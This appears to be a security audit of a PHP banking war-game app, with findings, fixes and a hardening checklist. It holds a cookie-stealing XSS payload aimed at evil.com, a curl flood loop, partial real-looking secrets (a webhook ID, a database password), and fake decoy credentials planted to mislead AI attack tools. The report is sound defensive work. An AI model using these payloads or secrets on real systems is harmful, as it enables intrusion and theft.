# TransactiWar Security Hardening Audit Report

**Date:** 2026-03-18
**Auditor:** Security Engineer (Automated Review)
**Application:** TransactiWar PHP + MySQL Banking War-Game
**Stack:** PHP 8.2 / MySQL 8.4 / Apache 2.4 / Docker on Ubuntu 24.04 (Azure VM)
**Threat Model:** Skilled attackers from r/bugbounty and r/netsec with full source access
**Scope:** Complete source code review of all PHP, SQL, Docker, Apache, and shell files

---

## EXECUTIVE SUMMARY

**Overall Risk Rating: MEDIUM**

The TransactiWar application demonstrates a mature security posture with substantial defense-in-depth. The development team has clearly invested significant effort in hardening authentication, session management, CSRF protection, file upload security, and Docker container isolation. The codebase consistently uses prepared statements, output encoding, and input validation.

However, several findings remain that skilled bug bounty hunters will target. The most critical issue is a **production secret committed to version control** (the Discord webhook URL and all database credentials in `docker/.env`). Beyond that, there are XSS vectors through `nl2br()` on already-escaped output, a Content-Disposition header injection vector, and a few information disclosure points that aid reconnaissance.

No SQL injection, no direct RCE, and no authentication bypass vulnerabilities were identified. The remaining issues are predominantly medium and low severity, reflecting a well-hardened application with residual defense-in-depth gaps.

---

## FINDINGS

---

### V-01: Production Secrets Committed to Version Control

**Severity:** CRITICAL
**Category:** Information Disclosure / Secrets Management
**File:** `docker/.env` (lines 1-17)

**Description:**
The file `docker/.env` contains live production secrets including database passwords, the session HMAC secret, and a Discord webhook URL. While `docker/.env` is listed in `.gitignore`, the `.gitignore` was recently modified (per `git status`: `M .gitignore`), suggesting the file may have been tracked previously or that the gitignore rule was added after the secret was already in history. The file exists on disk and is readable. Even if properly gitignored now, anyone who clones the repo at any prior commit has all secrets.

The Discord webhook URL (`https://discord.com/api/webhooks/1483494327559651371/...`) is a permanent credential that allows anyone to post messages to the team's Discord channel. An attacker could use it to send disinformation ("transfer endpoint is down, use backup at evil.com") or flood the channel to drown out real alerts.

**Attack Scenario:**
1. Attacker clones the repository (or browses git history).
2. Extracts `MYSQL_ROOT_PASSWORD`, `MYSQL_PASSWORD`, `SESSION_SECRET`, and `DISCORD_WEBHOOK_URL`.
3. If the DB port is exposed, connects directly. If not, uses the session secret to forge session fingerprints.
4. Uses the Discord webhook to flood the team's alerting channel during the attack, suppressing real alerts.

**Impact:** Full database compromise if DB port is reachable. Session forgery if `SESSION_SECRET` is known. Alert suppression via webhook abuse.

**Recommended Fix:**

Before (current state):
```
# docker/.env contains actual secrets on disk
MYSQL_ROOT_PASSWORD=notrootpassword
SESSION_SECRET=a64c6739fe...
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...
```

After:
```
# 1. Rotate ALL secrets immediately:
#    - Generate new MYSQL_ROOT_PASSWORD, MYSQL_PASSWORD
#    - Generate new SESSION_SECRET (openssl rand -hex 32)
#    - Regenerate the Discord webhook in Discord settings
# 2. Use git filter-repo to purge docker/.env from ALL history
# 3. Ensure docker/.env is in .gitignore BEFORE creating the file
# 4. For Azure deployment, use Azure Key Vault or VM environment variables
```

---

### V-02: XSS via nl2br() on Pre-Escaped HTML in Bio Display

**Severity:** HIGH
**Category:** Cross-Site Scripting (Stored XSS)
**File:** `public/view_profile.php` (lines 38, 66)

**Description:**
The bio field is displayed as `<?= nl2br($profileData['bio']) ?>`. The `$profileData['bio']` value was already HTML-entity-encoded by `escape_output()` in `profile_view_logic.php` line 83. The `nl2br()` function then converts `\n` characters to `<br />` tags. However, since `escape_output()` already encoded the content, the newlines that remain are literal `\n` characters that survived encoding. These will be converted to `<br>` tags by `nl2br()`.

The real risk here is subtle: `nl2br()` returns an HTML string and its output is injected directly via `<?= ... ?>` without further encoding. While the current `escape_output()` sanitizes the bio content before `nl2br()` processes it, this creates a fragile dependency on execution order. If any future code path sets `$profileData['bio']` to unsanitized content, the `nl2br()` call becomes an XSS sink.

More importantly, `nl2br()` on already-escaped data will produce double-encoded HTML entities visible to the user (e.g., `&amp;` displayed literally instead of `&`), which is a functional bug that may lead a developer to "fix" it by removing the `escape_output()` call -- creating an actual XSS.

**Attack Scenario:**
1. Attacker sets their bio to `Hello<script>document.location='https://evil.com/?c='+document.cookie</script>World`.
2. Currently: `escape_output()` neutralizes this. But a future developer sees `&lt;br&gt;` displayed literally and removes the encoding.
3. After the "fix": XSS fires on every profile view.

**Impact:** Stored XSS executing in every visitor's browser session. Cookie theft (mitigated by HttpOnly), account takeover via session manipulation, phishing overlays.

**Recommended Fix:**

Before (`public/view_profile.php` lines 38, 66):
```php
<?= nl2br($profileData['bio']) ?>
```

After:
```php
<?= nl2br($profileData['bio'], false) ?>
```

And in `includes/profile_view_logic.php` line 83, apply `nl2br()` AFTER `escape_output()` in a single expression, or better yet, store the raw bio and apply both at the template level:

```php
// In profile_view_logic.php:
'bio' => $user['bio'] ?? 'No operational biography provided.',

// In view_profile.php:
<?= nl2br(escape_output($profileData['bio']), false) ?>
```

This ensures the encoding always happens before the `nl2br()` conversion and makes the dependency explicit.

---

### V-03: Content-Disposition Header Injection in serve_image.php

**Severity:** MEDIUM
**Category:** Header Injection
**File:** `public/serve_image.php` (line 73)

**Description:**
The `$filename` variable is validated against `/^[a-zA-Z0-9._\-]+$/` at line 20, which blocks newline and carriage return characters. However, the filename is injected into a `Content-Disposition` header without quotes-escaping:

```php
header('Content-Disposition: inline; filename="' . $filename . '"');
```

While the regex currently prevents injection of control characters, the filename value `"` (a double-quote) would not pass the regex since `.` `_` and `-` are the only special characters allowed. This is currently safe, but the defense is implicit rather than explicit. A filename containing characters like `"` could break out of the quoted-string context in the header if the regex is ever loosened.

**Attack Scenario:**
1. If the filename regex is relaxed in a future change, an attacker could craft a filename like `x"; filename*=UTF-8''malware.exe` to manipulate the download filename shown to the user.
2. Current regex blocks this, but defense-in-depth suggests explicit encoding.

**Impact:** Limited -- potential download filename spoofing if the regex is relaxed in the future.

**Recommended Fix:**

Before (`public/serve_image.php` line 73):
```php
header('Content-Disposition: inline; filename="' . $filename . '"');
```

After:
```php
// RFC 6266 safe: percent-encode non-ASCII and special characters
$safeFilename = rawurlencode($filename);
header("Content-Disposition: inline; filename=\"{$safeFilename}\"");
```

---

### V-04: CSP Report Endpoint Lacks Rate Limiting

**Severity:** MEDIUM
**Category:** Denial of Service
**File:** `public/csp-report.php` (entire file)

**Description:**
The `/csp-report.php` endpoint accepts unauthenticated POST requests and writes every report to the database via `logSecurityEvent()`. There is no rate limiting, no authentication, and no CSRF check (by design -- browsers send CSP reports automatically). An attacker can flood this endpoint with fake CSP violation reports, filling the `activity_logs` table and the Discord webhook channel.

The 10KB body limit (line 25) prevents individual request amplification, but volume-based abuse is unrestricted. At 1000 requests/second, an attacker generates approximately 500MB/hour of log data.

**Attack Scenario:**
1. Attacker scripts a loop: `while true; do curl -X POST -d '{"csp-report":{"blocked-uri":"attacker"}}' https://target/csp-report.php; done`
2. `activity_logs` table grows rapidly, slowing queries.
3. Discord webhook is saturated with CSP_VIOLATION alerts, drowning out real security events.
4. Disk fills on the MySQL volume, causing cascading failures.

**Impact:** Log pollution, alert fatigue, potential disk exhaustion DoS.

**Recommended Fix:**

Before (`public/csp-report.php` lines 16-19):
```php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(204);
    exit;
}
```

After:
```php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(204);
    exit;
}

// Rate limit CSP reports: max 10 per IP per minute
$cspIp = function_exists('get_client_ip') ? get_client_ip() : ($_SERVER['REMOTE_ADDR'] ?? '0.0.0.0');
$cspRateKey = 'csp:' . substr(hash('sha256', $cspIp), 0, 16);
$cspRateStmt = $pdo->prepare("SELECT attempts, last_attempt FROM login_attempts WHERE ip = ? LIMIT 1");
$cspRateStmt->execute([$cspRateKey]);
$cspRateRow = $cspRateStmt->fetch(PDO::FETCH_ASSOC);
$cspNow = time();
if ($cspRateRow && (int)$cspRateRow['attempts'] >= 10 && ($cspNow - (int)$cspRateRow['last_attempt']) < 60) {
    http_response_code(204);
    exit;
}
$pdo->prepare("INSERT INTO login_attempts (ip, attempts, last_attempt) VALUES (?, 1, ?) ON DUPLICATE KEY UPDATE attempts = IF(last_attempt < ? - 60, 1, attempts + 1), last_attempt = ?")->execute([$cspRateKey, $cspNow, $cspNow, $cspNow]);
```

---

### V-05: Seed Accounts Use Real Team Member Names with Known Hashes

**Severity:** MEDIUM
**Category:** Authentication / Information Disclosure
**File:** `docker/setup.sh` (lines 150-157)

**Description:**
The seed script creates accounts with real team member names (`nishanth`, `tejas`, `divyansh`, `harshavardhan`, `vrishin`, `trudy`) using pre-computed bcrypt hashes. These accounts always exist and always have the same password hashes. An attacker with source code access (which is the threat model for this engagement) can:

1. Identify that these accounts definitely exist (skipping enumeration).
2. Attempt to crack the pre-computed bcrypt hashes offline (they are in the source code).
3. Target these specific accounts for social engineering since the real names are known.

The `ON DUPLICATE KEY UPDATE` clause also resets the password hash on every container restart, so even if a team member changes their password, the next deploy reverts it to the known hash.

**Attack Scenario:**
1. Attacker extracts bcrypt hashes from `setup.sh`.
2. Runs hashcat/john against them offline (bcrypt cost 10 is crackable for weak passwords).
3. If any team member used a weak password when generating the hash, the attacker obtains valid credentials.
4. `ON DUPLICATE KEY UPDATE password_hash = VALUES(password_hash)` reverts passwords on every restart.

**Impact:** Account compromise of team member accounts. Password revert on restart.

**Recommended Fix:**

Before (`docker/setup.sh` lines 148-163):
```sql
INSERT INTO users (username, email, password_hash, balance_paise, bio)
VALUES
  ('nishanth', 'nishanth@iith.in', '$2y$10$p9hl/...', 10000, '...'),
  ...
ON DUPLICATE KEY UPDATE
  email = VALUES(email),
  password_hash = VALUES(password_hash),
  ...
```

After:
```sql
-- Do NOT overwrite password_hash on duplicate. Let users keep their passwords.
INSERT INTO users (username, email, password_hash, balance_paise, bio)
VALUES
  ('agent_alpha', 'alpha@transactiwar.local', '$2y$10$...', 10000, 'Seed account'),
  ('agent_bravo', 'bravo@transactiwar.local', '$2y$10$...', 10000, 'Seed account'),
  ...
ON DUPLICATE KEY UPDATE
  email = VALUES(email),
  bio = VALUES(bio),
  updated_at = CURRENT_TIMESTAMP;
  -- NOTE: password_hash intentionally NOT updated
```

---

### V-06: IP Firewall Fails Open on Database Error

**Severity:** MEDIUM
**Category:** Access Control Bypass
**File:** `includes/ip_firewall.php` (lines 131-134)

**Description:**
The IP firewall's catch-all exception handler logs the error and returns, allowing the request to proceed:

```php
} catch (Throwable $e) {
    error_log('ip_firewall check error: ' . $e->getMessage());
}
```

This "fail open" design means that if the database becomes unavailable (e.g., during a DoS attack that exhausts MySQL connections), all IP blocks are silently bypassed. An attacker who is blocked can potentially cause database connection exhaustion through parallel requests, then bypass the firewall during the outage window.

**Attack Scenario:**
1. Attacker's IP is blocked in `blocked_ips` table.
2. Attacker floods the application with requests from multiple IPs to exhaust MySQL connection pool.
3. When the database connection fails, `checkIpFirewall()` catches the exception and returns without blocking.
4. Attacker's blocked IP can now access the application.

**Impact:** IP firewall bypass during database stress. Blocked attackers regain access.

**Recommended Fix:**

Before (`includes/ip_firewall.php` lines 131-134):
```php
} catch (Throwable $e) {
    // Fail open -- never block legitimate users due to a DB hiccup
    error_log('ip_firewall check error: ' . $e->getMessage());
}
```

After:
```php
} catch (Throwable $e) {
    error_log('ip_firewall check error (fail-closed): ' . $e->getMessage());
    // Fail CLOSED during war game -- security over availability.
    // A DB outage should not let blocked IPs through.
    http_response_code(503);
    header('Retry-After: 30');
    die('Service temporarily unavailable.');
}
```

Note: This is a tradeoff. Failing closed blocks legitimate users during DB outages. For a war game where the threat model is active attackers, failing closed is the correct choice. For production, failing open may be acceptable.

---

### V-07: Logout Cookie SameSite Attribute Inconsistency

**Severity:** LOW
**Category:** Cookie Security
**File:** `includes/auth.php` (line 992)

**Description:**
In the `logout_user()` function, the cookie-clearing `setcookie()` call uses `'samesite' => 'Lax'` (line 992), while the session configuration in `config/session.php` uses `'samesite' => 'Strict'` (line 10, 24). This mismatch means the deletion cookie has a different SameSite attribute than the original session cookie. While this is unlikely to cause a practical security issue (the cookie is being deleted with an expired timestamp), it is a defense-in-depth inconsistency.

**Attack Scenario:** No direct exploit. The inconsistency could theoretically cause browser-specific behavior where the deletion cookie does not fully replace the session cookie in edge cases.

**Impact:** Minimal. Potential for session cookie to persist after logout in certain browsers.

**Recommended Fix:**

Before (`includes/auth.php` line 992):
```php
'samesite' => $params['samesite'] ?? 'Lax',
```

After:
```php
'samesite' => $params['samesite'] ?? 'Strict',
```

---

### V-08: Registration Reveals Username/Email Collision

**Severity:** LOW
**Category:** Information Disclosure / User Enumeration
**File:** `public/register.php` (line 76), `includes/auth.php` (line 681)

**Description:**
When a registration attempt fails due to a duplicate username or email, the application returns `"Username or email already exists."` This confirms to an attacker that at least one of the submitted values is registered, enabling targeted enumeration. The message does not distinguish which field collided, which is better than revealing the specific field, but it still leaks information compared to a completely generic response.

**Attack Scenario:**
1. Attacker submits registration with a known-unique email and a guessed username.
2. If "Username or email already exists" is returned, the username exists.
3. Repeat with known-unique username and guessed email to enumerate emails.
4. Rate limiting (5 attempts per 15 minutes per IP) slows this but does not prevent it at scale from rotating IPs.

**Impact:** Username and email enumeration. The existing rate limiting makes bulk enumeration difficult but not impossible for a determined attacker with access to rotating proxies.

**Recommended Fix:**

Before (`public/register.php` line 76):
```php
} elseif ($result === 'duplicate') {
    $flash_error = 'Username or email already exists.';
```

After:
```php
} elseif ($result === 'duplicate') {
    // Use the same success message as legitimate registration.
    // The user will know something is wrong when they try to login.
    $flash_success = 'If your details are valid, your account has been created. Please try logging in.';
```

---

### V-09: Search Reveals User Existence via Differential Response

**Severity:** LOW
**Category:** Information Disclosure / User Enumeration
**File:** `public/searchbox.php` (lines 89-96)

**Description:**
The search functionality returns different messages for "No matching user found" versus "Invalid search query." This allows an attacker to distinguish between a valid but non-existent username format and an invalid input, which marginally aids enumeration. More significantly, exact-match search confirms user existence when a match is found.

However, this is inherent to the feature's design (search is supposed to find users), and the rate limiting (30 searches per 60 seconds per user) makes bulk enumeration impractical.

**Attack Scenario:** An authenticated attacker uses the search endpoint to confirm specific username existence. Rate-limited to 30/minute.

**Impact:** Minimal due to rate limiting. Inherent to the search feature's purpose.

**Recommended Fix:** No code change required. The existing rate limiting adequately mitigates this. Consider this an accepted risk inherent to the search functionality.

---

### V-10: Transaction History Pagination Page Parameter Not Upper-Bounded

**Severity:** LOW
**Category:** Input Validation
**File:** `public/transaction_history.php` (lines 25-27)

**Description:**
The page parameter is validated as a positive integer but has no upper bound. A request to `/transaction_history.php?page=999999999` will execute a query with `OFFSET 19999999980`, which MySQL must process even though it returns no results. Very large offsets on InnoDB tables without covering indexes require MySQL to scan and skip rows, potentially causing slow queries.

**Attack Scenario:**
1. Attacker requests `/transaction_history.php?page=2147483647` repeatedly.
2. Each request forces MySQL to compute a large offset, consuming CPU and I/O.
3. Sustained requests degrade database performance for all users.

**Impact:** Low-severity DoS via expensive database queries.

**Recommended Fix:**

Before (`public/transaction_history.php` lines 25-27):
```php
$rawPage = get_int('page');
$page = ($rawPage !== null && $rawPage > 0) ? $rawPage : 1;
$offset = ($page - 1) * $perPage;
```

After:
```php
$rawPage = get_int('page');
$page = ($rawPage !== null && $rawPage > 0) ? min($rawPage, $totalPages) : 1;
$offset = ($page - 1) * $perPage;
```

Note: This requires computing `$totalPages` before the page clamping, which means the count query must run first (it already does).

---

### V-11: AI Trap File Contains Fake Credentials That Aid Real Attackers

**Severity:** MEDIUM
**Category:** Information Disclosure / Defense Strategy
**File:** `includes/ai_traps.php` (lines 85-91)

**Description:**
The AI trap HTML comments contain fake "dev notes" including:

```
The old debug backdoor at /debug.php?key=admin123 has been patched.
TODO: The test account admin:admin123 should be removed before production.
NOTE: Rate limiting is disabled on /api/v2/ endpoints for performance testing.
WARNING: The JWT secret is still hardcoded in config/jwt.php as "supersecretkey123"
```

While these are intended as misdirection for AI tools, human attackers reading the source code will immediately recognize these as traps (they are in a file literally named `ai_traps.php`). Worse, the attackers now know:

1. The team is using AI trap techniques (reveals defensive strategy).
2. The team is aware of and defending against AI-assisted attacks.
3. The specific endpoints mentioned do NOT exist, saving the attacker time that would have been spent probing them.

**Attack Scenario:**
1. Attacker reads `ai_traps.php` (source is available).
2. Immediately identifies all "fake" breadcrumbs and ignores them.
3. Learns that the team is security-conscious enough to deploy traps, adjusting their attack strategy accordingly.
4. Saves time by not probing the fake endpoints.

**Impact:** Reveals defensive strategy. Provides negative-information (confirms what does NOT exist).

**Recommended Fix:**
If the goal is to waste attacker time, the traps need to be convincing and not in a file named `ai_traps.php`. Consider embedding subtle but realistic-looking "accidental" information in legitimate files instead, or removing the traps entirely since they provide negative value against source-aware attackers.

---

### V-12: Missing CSRF Protection on Honeypot Field Validation

**Severity:** LOW
**Category:** Incomplete Defense
**File:** `includes/ai_traps.php` (line 99-104), all forms using `aiTrapForm()`

**Description:**
The honeypot field `ai_trap_field` is embedded in login and registration forms but is never validated server-side. No PHP code checks whether `$_POST['ai_trap_field']` was populated. The honeypot is purely decorative.

**Attack Scenario:** Bots that fill all form fields will not be detected by this honeypot since no server-side validation exists.

**Impact:** Minimal. The honeypot provides no actual bot protection.

**Recommended Fix:**

Add server-side validation in the login and registration POST handlers:

```php
// At the top of every POST handler that uses aiTrapForm():
if (!empty($_POST['ai_trap_field'])) {
    logSecurityEvent(LOG_SUSPICIOUS, 'honeypot_triggered');
    http_response_code(403);
    exit('Request forbidden.');
}
```

---

### V-13: Discord Webhook Rate Limit File Race Condition

**Severity:** LOW
**Category:** Race Condition
**File:** `includes/discord_webhook.php` (lines 305-377)

**Description:**
The Discord rate limiter uses a shared temp file (`/tmp/transactiwar_discord_ratelimit.json`) with `file_get_contents()` and `file_put_contents()` with `LOCK_EX`. However, `_discordRateLimitOk()` reads the state without acquiring a lock, while `_discordRateLimitRecord()` writes with `LOCK_EX`. Under concurrent requests, two processes can both read the state, both determine they are under the limit, and both send webhooks, exceeding the intended rate limit.

**Attack Scenario:**
1. Multiple concurrent requests trigger security events.
2. Both read the rate limit file and see count < 15.
3. Both send webhooks, then both write updated counts.
4. Discord rate limit (30/min) is exceeded, causing the webhook to be temporarily blocked.

**Impact:** Discord webhook URL could be temporarily rate-limited or permanently revoked if abuse is detected. This only affects alerting, not application security.

**Recommended Fix:**

Before:
```php
function _discordRateLimitOk(): bool {
    $stateFile = sys_get_temp_dir() . '/transactiwar_discord_ratelimit.json';
    $state = _discordReadState($stateFile);
    // ...
}
```

After:
```php
function _discordRateLimitOk(): bool {
    $stateFile = sys_get_temp_dir() . '/transactiwar_discord_ratelimit.json';
    // Use flock for atomic check-and-update
    $fp = fopen($stateFile, 'c+');
    if ($fp === false) return true;
    if (!flock($fp, LOCK_EX)) { fclose($fp); return true; }

    $raw = stream_get_contents($fp);
    $state = ($raw !== false) ? (json_decode($raw, true) ?? []) : [];
    $now = time();
    $state['timestamps'] = array_values(array_filter(
        $state['timestamps'] ?? [],
        static fn(int $ts): bool => ($now - $ts) < DISCORD_RATE_WINDOW
    ));

    $ok = count($state['timestamps']) < DISCORD_RATE_LIMIT;
    if ($ok) {
        $state['timestamps'][] = $now;
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, json_encode($state));
    }

    flock($fp, LOCK_UN);
    fclose($fp);
    return $ok;
}
```

---

### V-14: Apache AllowOverride Permits Script Execution Overrides

**Severity:** LOW
**Category:** Server Misconfiguration
**File:** `docker/apache/default-ssl.conf` (line 22)

**Description:**
The `AllowOverride` directive includes `Options=ExecCGI,Indexes`:

```apache
AllowOverride FileInfo AuthConfig Options=ExecCGI,Indexes
```

While this is significantly hardened compared to `AllowOverride All`, permitting `Options=ExecCGI` means a `.htaccess` file inside the public directory could enable CGI execution. Combined with the read-only filesystem, this is not practically exploitable (the attacker cannot write a new `.htaccess`), but it is a defense-in-depth gap.

**Attack Scenario:** If the read-only filesystem constraint is ever relaxed, an attacker who can write files to the web root could create a `.htaccess` enabling CGI execution and upload a CGI script.

**Impact:** No practical impact with current read-only filesystem. Defense-in-depth improvement.

**Recommended Fix:**

Before:
```apache
AllowOverride FileInfo AuthConfig Options=ExecCGI,Indexes
```

After:
```apache
AllowOverride FileInfo AuthConfig Options=Indexes
```

---

### V-15: Diagnostic Script Accessible Inside Container

**Severity:** LOW
**Category:** Information Disclosure
**File:** `scripts/debug/diagnostic.php`

**Description:**
The diagnostic script is located at `scripts/debug/diagnostic.php` and is NOT directly web-accessible (it is outside the web root and not mounted into the container via docker-compose). The H7 fix correctly mounts only `public/`, `includes/`, `config/`, and `storage/` directories. This file is effectively unreachable. However, the old worktree copies still exist at `.claude/worktrees/*/scripts/debug/diagnostic.php`, and if anyone accidentally mounts the full repo root, the diagnostic becomes accessible.

**Attack Scenario:** Only exploitable if the volume mount in docker-compose.yml is reverted to `../:/var/www/html:ro`.

**Impact:** No current impact. Noted for awareness.

**Recommended Fix:** No action needed. The current selective mount strategy is correct. Ensure it is never changed back to a full-repo mount.

---

### V-16: Missing HTTP Method Restriction on Endpoints

**Severity:** LOW
**Category:** HTTP Method Handling
**File:** Multiple public PHP files

**Description:**
Most endpoints do not explicitly reject unexpected HTTP methods. For example, `view_profile.php`, `searchbox.php`, and `transaction_history.php` accept any HTTP method. While the application logic only processes GET/POST, the lack of explicit method filtering means that PUT, PATCH, DELETE, and OPTIONS requests reach the PHP handler and execute the page logic (minus the POST-specific branches).

Apache's `TraceEnable Off` in the Dockerfile hardening config correctly blocks TRACE requests.

**Attack Scenario:** An attacker sends a DELETE request to a page. The page renders normally since it only checks for POST. No direct impact but violates the principle of least privilege.

**Impact:** Minimal. No state-changing operations are triggered by unexpected methods.

**Recommended Fix:** Add at the top of each endpoint:

```php
if (!in_array($_SERVER['REQUEST_METHOD'], ['GET', 'HEAD'], true)) {
    http_response_code(405);
    header('Allow: GET, HEAD');
    exit;
}
```

For POST endpoints (login, register, payment), allow `['GET', 'HEAD', 'POST']`.

---

### V-17: Session Fingerprint IP Change Kills Mobile Users

**Severity:** INFO
**Category:** Session Management / Usability
**File:** `config/session.php` (lines 76-88), `includes/auth.php` (lines 832-847)

**Description:**
The session fingerprint includes the client IP (`$currentFingerprint = hash_hmac('sha256', $userAgent . '|' . $clientIp, $secret)`). When a user's IP changes (mobile network handoff, VPN reconnection, ISP rotation), their session is destroyed and they are redirected to login. This is a security feature that prevents session hijacking, but it also impacts usability for mobile users.

For the war game context, this is appropriate since availability is less important than security. Noted here for completeness.

**Attack Scenario:** N/A -- this is a design tradeoff, not a vulnerability.

**Impact:** Users on unstable networks are logged out frequently.

**Recommended Fix:** No change for war game context. For production, consider relaxing to IP-prefix binding (e.g., /24 for IPv4) or removing IP from the fingerprint while keeping User-Agent.

---

### V-18: Unvalidated `include` of `header.html`

**Severity:** INFO
**Category:** Path Traversal (Theoretical)
**File:** `public/view_profile.php` (line 15), `public/profile.php` (line 27), others

**Description:**
Multiple files use `include __DIR__ . '/header.html';` which is safe because `__DIR__` is a compile-time constant pointing to the file's directory. There is no user input in the include path. This is noted only to confirm it was reviewed and is not a vulnerability.

**Impact:** None.

---

### V-19: `escape_js()` Returns Bare JSON Without String Wrapper

**Severity:** INFO
**Category:** Cross-Site Scripting (Defense in Depth)
**File:** `includes/sanitize.php` (lines 80-90)

**Description:**
The `escape_js()` function returns `json_encode()` output, which includes the surrounding double quotes. In `payment_page.php` line 190:

```javascript
var recipientName = <?= escape_js($receiverUsername) ?>;
```

This works correctly because `json_encode()` wraps strings in quotes and escapes internal characters. The output will be `var recipientName = "safe_value";`. This is safe as implemented. Noted here to confirm it was reviewed.

**Impact:** None currently. The implementation is correct.

---

### V-20: Storage Volume Not Read-Only in docker-compose.yml

**Severity:** LOW
**Category:** Docker Security
**File:** `docker/docker-compose.yml` (line 123)

**Description:**
The storage volume is mounted read-write (`../storage:/var/www/html/storage`) without `:ro`. This is necessary for the application to write uploaded images, but it means an attacker who achieves RCE can write arbitrary files to this directory. The `.htaccess` in `storage/uploads/` blocks direct access, and the directory is outside the web root, so this is a defense-in-depth observation rather than a direct vulnerability.

**Attack Scenario:**
1. Attacker achieves RCE through a 0day in PHP or a library.
2. Writes a PHP webshell to `/var/www/html/storage/uploads/shell.php`.
3. Storage `.htaccess` blocks direct access, and it is outside the web root.
4. But the attacker already has RCE, so the webshell is redundant.

**Impact:** Minimal -- the attacker already has RCE by the time this matters. The writable mount is necessary for file uploads.

**Recommended Fix:** Accept this as a necessary tradeoff. Consider mounting `storage/uploads` as a dedicated named volume rather than a bind mount, and ensure the `noexec` flag is set at the filesystem level if possible.

---

### V-21: No `Vary: Cookie` Header on Authenticated Pages

**Severity:** INFO
**Category:** Cache Poisoning (Theoretical)
**File:** `includes/header.php`

**Description:**
Authenticated pages set `Cache-Control: no-store`, which prevents caching entirely. The absence of `Vary: Cookie` is irrelevant because `no-store` takes precedence. No vulnerability exists. Noted for completeness.

**Impact:** None.

---

### V-22: SSL Configuration Missing OCSP Stapling

**Severity:** INFO
**Category:** TLS Configuration
**File:** `docker/apache/default-ssl.conf` (line 15)

**Description:**
`SSLUseStapling Off` is explicitly set. OCSP stapling improves TLS handshake performance and privacy by allowing the server to include a cached OCSP response. However, for self-signed certificates (the default configuration), OCSP stapling is not applicable since there is no CA to issue OCSP responses. For production with a real CA-signed certificate, enabling OCSP stapling is recommended.

**Impact:** None for self-signed certs. Minor privacy/performance improvement for production TLS.

**Recommended Fix:** When deploying with real certificates, add:

```apache
SSLUseStapling On
SSLStaplingCache shmcb:/tmp/stapling_cache(128000)
```

---

## PRIORITIZED HARDENING CHECKLIST

### CRITICAL (Fix immediately before exposure)

- [ ] **V-01**: Rotate ALL secrets in `docker/.env` (database passwords, session secret, Discord webhook URL). Purge `docker/.env` from git history. Verify `.gitignore` coverage. For Azure deployment, use Key Vault or environment variables set on the VM, not in the repo.

### HIGH (Fix before bug bounty launch)

- [ ] **V-02**: Fix `nl2br()` on pre-escaped bio output in `view_profile.php`. Apply encoding and `nl2br()` in the correct order at the template level to prevent fragile dependency.

### MEDIUM (Fix within first 24 hours)

- [ ] **V-04**: Add IP-based rate limiting to `csp-report.php` to prevent log flooding.
- [ ] **V-05**: Change seed accounts to use generic names (not real team member names). Remove `password_hash` from `ON DUPLICATE KEY UPDATE` clause.
- [ ] **V-06**: Change IP firewall to fail-closed during war game (503 on DB error).
- [ ] **V-11**: Reconsider AI traps strategy -- they reveal defensive posture to source-aware attackers.

### LOW (Fix when time permits)

- [ ] **V-03**: Add explicit RFC 6266 encoding to `Content-Disposition` filename in `serve_image.php`.
- [ ] **V-07**: Fix SameSite attribute inconsistency in `logout_user()` cookie deletion.
- [ ] **V-08**: Consider making registration duplicate message indistinguishable from success.
- [ ] **V-10**: Clamp pagination page parameter to `$totalPages` upper bound.
- [ ] **V-12**: Add server-side validation for the honeypot `ai_trap_field`.
- [ ] **V-13**: Fix Discord rate limiter race condition with `flock()`.
- [ ] **V-14**: Remove `ExecCGI` from `AllowOverride Options` in Apache config.
- [ ] **V-16**: Add explicit HTTP method restrictions to all endpoints.
- [ ] **V-20**: Document the storage volume write requirement; consider `noexec` at OS level.

---

## SECURITY STRENGTHS

The following aspects of the application are well-implemented and represent strong security practices:

1. **Prepared Statements Everywhere**: Every database query across all files uses PDO prepared statements with parameterized values. No string concatenation in queries was found. SQL injection risk is effectively eliminated.

2. **Comprehensive CSRF Protection**: The HMAC-bound, single-use token pool design (H3 fix) is sophisticated. The pool supports multi-tab usage while maintaining single-use guarantees. Origin/Referer validation provides a second layer. CSRF is enforced on all state-changing endpoints including logout.

3. **Transfer Deadlock Prevention**: The `process_payment.php` uses ordered `FOR UPDATE` locks (lower ID first) to prevent deadlocks in concurrent bidirectional transfers. This is textbook correct.

4. **Transfer Double-Spend Prevention**: The combination of CSRF token, transfer nonce (keyed by target UUID), and page load ID creates a three-layer defense against double-submission. The `transfer_complete` session flag provides a fourth layer.

5. **Database-Level Constraints**: `CHECK (balance_paise >= 0)` with `BIGINT UNSIGNED`, `CHECK (sender_id <> receiver_id)`, `CHECK (amount_paise >= 100)`, and the username immutability trigger provide defense-in-depth at the data layer.

6. **Image Upload Security**: Multi-layer defense with MIME type validation, dimension checking (decompression bomb prevention), GD library re-rendering (strips polyglots and metadata), random filename generation, storage outside web root, and serving through a gatekeeper script with path traversal protection.

7. **Session Security**: Strict mode, HttpOnly, Secure, SameSite=Strict cookies. IP + User-Agent HMAC fingerprinting. Inactivity timeout (30min), absolute lifetime (1hr), and periodic regeneration (5min). Session version tracking for remote invalidation after password change.

8. **Container Hardening**: Read-only filesystem, unprivileged user (www-data via `setpriv`), `no-new-privileges` security option, resource limits, `noexec` tmpfs mounts, selective volume mounts (not whole repo), network segmentation (backend is internal-only).

9. **Anti-Enumeration in Login**: Constant-time comparison, dummy hash for non-existent users, randomized delay, database-backed per-identifier+IP rate limiting with exponential backoff and hard lockout.

10. **Pre-Hash Password Strategy**: SHA-384 pre-hash before bcrypt eliminates the 72-byte truncation vulnerability. Transparent migration path for legacy hashes.

11. **Security Headers**: Comprehensive set including CSP (nonce-based with `strict-dynamic`), HSTS (1 year with preload), X-Frame-Options DENY, COEP, COOP, CORP, Permissions-Policy, and Referrer-Policy. `ServerTokens Prod`, `ServerSignature Off`, `TraceEnable Off`, and `expose_php = Off` suppress version disclosure.

12. **Proxy-Aware IP Handling**: `request.php` implements RFC 7239-compliant X-Forwarded-For parsing with an explicit `TRUSTED_PROXIES` whitelist. The rightmost-untrusted-IP algorithm prevents spoofing.

13. **Discord Real-Time Alerting**: Security events are classified by severity and sent to Discord with structured embeds. Rate limiting prevents webhook abuse. SSRF is prevented by validating the webhook URL pattern.

14. **Comprehensive Audit Logging**: Every security-relevant action (login, logout, transfer, CSRF failure, upload failure, session hijack, etc.) is logged to the database with user ID, IP, event type, and forensic detail. Log injection is prevented by sanitizing event strings and details.

